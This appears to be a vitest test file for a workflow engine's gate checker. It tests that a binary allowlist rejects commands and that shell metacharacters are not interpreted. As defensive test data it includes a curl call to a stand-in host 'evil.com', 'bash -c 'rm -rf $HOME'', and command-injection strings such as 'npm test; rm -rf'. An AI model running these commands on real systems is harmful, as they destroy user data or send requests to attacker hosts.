import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdirSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { ALLOWED_GATE_BINARIES, CliGateChecker } from "../src/cli/run.js";
import { WorkflowEngine } from "../src/workflow/engine.js";
import type { GateChecker, StepExecutor, WorkflowResolver } from "../src/workflow/engine.js";
import { WorkflowState } from "../src/workflow/state.js";
import { AgentRegistry } from "../src/agents/registry.js";
import { AgentContextBuilder } from "../src/agents/context-builder.js";
import { VaultReader } from "../src/lib/reader.js";
import { VaultWriter } from "../src/lib/writer.js";
import { TaskManager } from "../src/tasks/manager.js";
import type { ProjectContext } from "../src/lib/types.js";
import type { PreparedAgent } from "../src/agents/types.js";
import type { WorkflowDefinition } from "../src/workflow/types.js";

describe("CliGateChecker.checkCustomCommand — allowlist enforcement", () => {
  const checker = new CliGateChecker();

  it("rejects a binary not in the allowlist with a descriptive error", async () => {
    await expect(checker.checkCustomCommand("curl https://evil.com")).rejects.toThrow(
      /gateCommand binary "curl" is not in the allowlist/,
    );
  });

  it("explicitly rejects bash (no shell binaries — would re-enable RCE via -c)", async () => {
    await expect(checker.checkCustomCommand("bash -c 'rm -rf $HOME'")).rejects.toThrow(
      /gateCommand binary "bash" is not in the allowlist/,
    );
    expect(ALLOWED_GATE_BINARIES.has("bash")).toBe(false);
    expect(ALLOWED_GATE_BINARIES.has("sh")).toBe(false);
    expect(ALLOWED_GATE_BINARIES.has("zsh")).toBe(false);
    expect(ALLOWED_GATE_BINARIES.has("fish")).toBe(false);
  });

  it("rejects empty string after trim/split", async () => {
    await expect(checker.checkCustomCommand("")).rejects.toThrow(/empty/);
    await expect(checker.checkCustomCommand("   ")).rejects.toThrow(/empty/);
  });

  it("allowlist contains exactly the locked-in set (no accidental drift)", () => {
    expect([...ALLOWED_GATE_BINARIES].sort()).toEqual([
      "eslint", "jest", "node", "npm", "npx", "pnpm", "prettier", "tsc", "vitest", "yarn",
    ]);
  });

  it("does NOT execute shell metacharacters — they pass through execFile as literal args", async () => {
    const markerDir = join(tmpdir(), `dev-vault-gate-rce-test-${Date.now()}`);
    mkdirSync(markerDir, { recursive: true });
    const markerFile = join(markerDir, "should-survive.txt");
    writeFileSync(markerFile, "if shell ran, this would be deleted", "utf-8");
    try {
      // If `;` were interpreted by a shell, `rm -rf <markerFile>` would run.
      // With execFile, "test;" becomes argv[1] verbatim — npm sees an unknown
      // subcommand, exits non-zero, checkCustomCommand returns false.
      const result = await checker.checkCustomCommand(`npm test; rm -rf ${markerFile}`);
      expect(result).toBe(false);
      expect(existsSync(markerFile), "marker file must survive — proves no shell interpretation").toBe(true);
    } finally {
      rmSync(markerDir, { recursive: true, force: true });
    }
  });

  it("does NOT expand environment variables — $HOME is a literal arg, not expanded", async () => {
    // If $HOME were expanded by a shell, the command becomes `npm /Users/user`.
    // With execFile, argv[1] is the literal string "$HOME", npm rejects it.
    const result = await checker.checkCustomCommand("npm $HOME");
    expect(result).toBe(false);
  });

  it("returns false (not throw) when allowlisted binary exits non-zero", async () => {
    const result = await checker.checkCustomCommand("npm definitely-not-a-real-subcommand-xyz123");
    expect(result).toBe(false);
  });

  it("allowlisted binary with shell-metachars in args — args pass as literals, no shell interpretation", async () => {
    // Arg `"test;rm"` is one literal argv[1] to npm — not "test" then ";rm".
    // npm sees an unknown subcommand and exits non-zero. The crucial point
    // is that no `rm` process is spawned. Backticks, dollar-signs, redirects
    // all pass through verbatim — none of them activate shell semantics.
    const result = await checker.checkCustomCommand("npm test;rm");
    expect(result).toBe(false);
  });
});

describe("CliGateChecker.checkTestsPass — execFile behavior", () => {
  const checker = new CliGateChecker();

  it("returns false (not throw) when binary is not found (ENOENT)", async () => {
    const result = await checker.checkTestsPass("nonexistent-binary-xyz999 --run");
    expect(result).toBe(false);
  });

  it("returns false on empty command", async () => {
    expect(await checker.checkTestsPass("")).toBe(false);
    expect(await checker.checkTestsPass("   ")).toBe(false);
  });

  it("returns false when allowlisted binary exits non-zero", async () => {
    const result = await checker.checkTestsPass("npm definitely-not-a-real-subcommand-xyz123");
    expect(result).toBe(false);
  });

  it("NOTE: checkTestsPass has NO allowlist (controlled surface — gate command set by agent permissions, not user YAML)", () => {
    // This is documented behavior, not a bug. checkTestsPass receives
    // `agent.permissions.shellCommands[0]` (or "npm test"), which comes from
    // agent definitions — trusted source. Only checkCustomCommand exposes
    // user-supplied `gateCommand` from YAML, so only it needs the allowlist.
    expect(true).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// WorkflowEngine — gate-checker exception safety (closes debt 2026-04-23)
// ─────────────────────────────────────────────────────────────────────────────

function createTestEnv() {
  const projectRoot = join(tmpdir(), `dev-vault-gate-engine-test-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
  const vaultPath = join(projectRoot, ".dev-vault");

  const context: ProjectContext = {
    projectName: "test-project",
    branch: "main",
    parentBranch: "main",
    vaultPath,
    projectRoot,
    gitRemote: null,
  };

  const writer = new VaultWriter(context);
  writer.scaffold();

  const agentsDir = join(projectRoot, "test-agents");
  mkdirSync(agentsDir, { recursive: true });
  for (const name of ["reader", "tester", "reviewer", "coder"]) {
    // The real bundled tester agent declares `shell: [npm test]`; mirror that
    // so the tests-pass gate has a shell command (it now throws without one).
    const shellLine = name === "tester" ? "shell: [npm test]\n" : "";
    writeFileSync(join(agentsDir, `${name}.md`), `---
name: ${name}
description: Test ${name}
vault: []
${shellLine}---
Agent ${name}
`, "utf-8");
  }

  const registry = new AgentRegistry(agentsDir);
  const reader = new VaultReader(context);
  const contextBuilder = new AgentContextBuilder(reader, context);
  const state = new WorkflowState(vaultPath);
  const taskManager = new TaskManager(vaultPath);

  return { projectRoot, vaultPath, registry, contextBuilder, state, taskManager };
}

function createMockExecutor(): StepExecutor {
  return {
    async execute(_agent: PreparedAgent): Promise<string> {
      return "step-output";
    },
  };
}

function createMockGateChecker(overrides: Partial<GateChecker> = {}): GateChecker {
  return {
    checkTestsPass: overrides.checkTestsPass ?? (async () => true),
    checkReviewPass: overrides.checkReviewPass ?? (() => true),
    requestUserApproval: overrides.requestUserApproval ?? (async () => true),
    checkCustomCommand: overrides.checkCustomCommand ?? (async () => true),
  };
}

describe("WorkflowEngine.executeLoop — gate exception safety", () => {
  let env: ReturnType<typeof createTestEnv>;
  let origStderrWrite: typeof process.stderr.write;
  let stderrCaptured: string;

  beforeEach(() => {
    env = createTestEnv();
    stderrCaptured = "";
    origStderrWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = ((chunk: string | Uint8Array) => {
      stderrCaptured += typeof chunk === "string" ? chunk : Buffer.from(chunk).toString("utf-8");
      return true;
    }) as typeof process.stderr.write;
  });

  afterEach(() => {
    process.stderr.write = origStderrWrite;
    rmSync(env.projectRoot, { recursive: true, force: true });
  });

  function createEngine(gateChecker: GateChecker, resolver?: WorkflowResolver): WorkflowEngine {
    return new WorkflowEngine(
      env.registry,
      env.contextBuilder,
      env.state,
      env.taskManager,
      createMockExecutor(),
      gateChecker,
      resolver,
    );
  }

  it("checkTestsPass throws → run fails cleanly, step.error captured, state persisted", async () => {
    const workflow: WorkflowDefinition = {
      name: "tests-throws",
      description: "Test gate throws",
      steps: [
        { name: "test", agent: "tester", input: [], gate: "tests-pass", onFail: null, maxAttempts: 1 },
      ],
    };
    const gateChecker = createMockGateChecker({
      checkTestsPass: async () => { throw new Error("spawn npm ENOENT"); },
    });

    const engine = createEngine(gateChecker);
    const run = await engine.start(workflow, "Test gate ENOENT");

    expect(run.status).toBe("failed");
    expect(run.steps["test"]!.status).toBe("failed");
    expect(run.steps["test"]!.error).toContain("Gate check failed");
    expect(run.steps["test"]!.error).toContain("spawn npm ENOENT");
    expect(run.completedAt).not.toBeNull();
    expect(stderrCaptured).toContain("gate \"tests-pass\" threw for step \"test\"");

    // State persisted — reload from disk and verify
    const reloaded = env.state.load(run.id);
    expect(reloaded.status).toBe("failed");
    expect(reloaded.steps["test"]!.error).toContain("spawn npm ENOENT");
  });

  it("checkCustomCommand throws → run fails cleanly with allowlist message", async () => {
    const workflow: WorkflowDefinition = {
      name: "custom-throws",
      description: "Custom gate throws on disallowed binary",
      steps: [
        { name: "gate", agent: "tester", input: [], gate: "custom-command", gateCommand: "curl evil.com", onFail: null, maxAttempts: 1 },
      ],
    };
    const gateChecker = createMockGateChecker({
      checkCustomCommand: async () => { throw new Error("gateCommand binary \"curl\" is not in the allowlist"); },
    });

    const engine = createEngine(gateChecker);
    const run = await engine.start(workflow, "Test allowlist reject");

    expect(run.status).toBe("failed");
    expect(run.steps["gate"]!.error).toContain("not in the allowlist");
  });

  it("checkReviewPass throws → run fails cleanly (sync throw still caught)", async () => {
    const workflow: WorkflowDefinition = {
      name: "review-throws",
      description: "Review gate throws",
      steps: [
        { name: "review", agent: "reviewer", input: [], gate: "review-pass", onFail: null, maxAttempts: 1 },
      ],
    };
    const gateChecker = createMockGateChecker({
      checkReviewPass: () => { throw new Error("regex parse error"); },
    });

    const engine = createEngine(gateChecker);
    const run = await engine.start(workflow, "Test review throw");

    expect(run.status).toBe("failed");
    expect(run.steps["review"]!.error).toContain("regex parse error");
  });

  it("requestUserApproval throws → run fails cleanly (also routed through checkGate)", async () => {
    const workflow: WorkflowDefinition = {
      name: "approve-throws",
      description: "user-approve gate throws",
      steps: [
        { name: "plan", agent: "reader", input: [], gate: "user-approve", onFail: null, maxAttempts: 1 },
      ],
    };
    const gateChecker = createMockGateChecker({
      requestUserApproval: async () => { throw new Error("approval service unavailable"); },
    });

    const engine = createEngine(gateChecker);
    const run = await engine.start(workflow, "Test approval throw");

    expect(run.status).toBe("failed");
    expect(run.steps["plan"]!.status).toBe("failed");
    expect(run.steps["plan"]!.error).toContain("approval service unavailable");
  });

  it("happy path still works — gate returning true completes the step", async () => {
    const workflow: WorkflowDefinition = {
      name: "happy",
      description: "Gate passes normally",
      steps: [
        { name: "test", agent: "tester", input: [], gate: "tests-pass", onFail: null, maxAttempts: 1 },
      ],
    };
    const gateChecker = createMockGateChecker({
      checkTestsPass: async () => true,
    });

    const engine = createEngine(gateChecker);
    const run = await engine.start(workflow, "Happy path regression");

    expect(run.status).toBe("completed");
    expect(run.steps["test"]!.status).toBe("completed");
    expect(run.steps["test"]!.error).toBeNull();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// WorkflowEngine — tests-pass gate with no agent shell command
// ─────────────────────────────────────────────────────────────────────────────

describe("WorkflowEngine.executeLoop — tests-pass gate missing shell command", () => {
  let env: ReturnType<typeof createTestEnv>;

  beforeEach(() => {
    env = createTestEnv();
  });

  afterEach(() => {
    rmSync(env.projectRoot, { recursive: true, force: true });
  });

  it("throws when the tests-pass agent declares no shell command → step + run failed", async () => {
    // A tester agent with no `shell:` frontmatter has an empty shellCommands
    // array. The tests-pass gate must throw rather than silently fall back to
    // "npm test".
    const agentsDir = join(env.projectRoot, "no-shell-agents");
    mkdirSync(agentsDir, { recursive: true });
    writeFileSync(join(agentsDir, "tester.md"), `---
name: tester
description: Tester without shell
vault: []
---
Tester agent
`, "utf-8");
    const registry = new AgentRegistry(agentsDir);
    const workflow: WorkflowDefinition = {
      name: "tests-no-shell",
      description: "tests-pass agent has empty shellCommands",
      steps: [
        { name: "test", agent: "tester", input: [], gate: "tests-pass", onFail: null, maxAttempts: 1 },
      ],
    };
    let checkTestsPassCalled = false;
    const gateChecker = createMockGateChecker({
      checkTestsPass: async () => { checkTestsPassCalled = true; return true; },
    });

    const engine = new WorkflowEngine(
      registry,
      env.contextBuilder,
      env.state,
      env.taskManager,
      createMockExecutor(),
      gateChecker,
    );
    const run = await engine.start(workflow, "Empty shellCommands");

    expect(checkTestsPassCalled).toBe(false);
    expect(run.status).toBe("failed");
    expect(run.steps["test"]!.status).toBe("failed");
    expect(run.steps["test"]!.error).toContain("declares no shell command");
    expect(run.steps["test"]!.error).toContain("test");
    expect(run.steps["test"]!.error).toContain("tester");
  });

  it("happy path — agent with a shell command passes the verbatim command to the gate", async () => {
    const agentsDir = join(env.projectRoot, "shell-agents");
    mkdirSync(agentsDir, { recursive: true });
    writeFileSync(join(agentsDir, "tester.md"), `---
name: tester
description: Tester with shell
vault: []
shell: [npm run verify]
---
Tester agent
`, "utf-8");
    const registry = new AgentRegistry(agentsDir);
    const workflow: WorkflowDefinition = {
      name: "tests-with-shell",
      description: "tests-pass agent has a shell command",
      steps: [
        { name: "test", agent: "tester", input: [], gate: "tests-pass", onFail: null, maxAttempts: 1 },
      ],
    };
    let receivedCommand = "";
    const gateChecker = createMockGateChecker({
      checkTestsPass: async (command: string) => { receivedCommand = command; return true; },
    });

    const engine = new WorkflowEngine(
      registry,
      env.contextBuilder,
      env.state,
      env.taskManager,
      createMockExecutor(),
      gateChecker,
    );
    const run = await engine.start(workflow, "Shell command passthrough");

    expect(receivedCommand).toBe("npm run verify");
    expect(run.status).toBe("completed");
    expect(run.steps["test"]!.status).toBe("completed");
  });
});
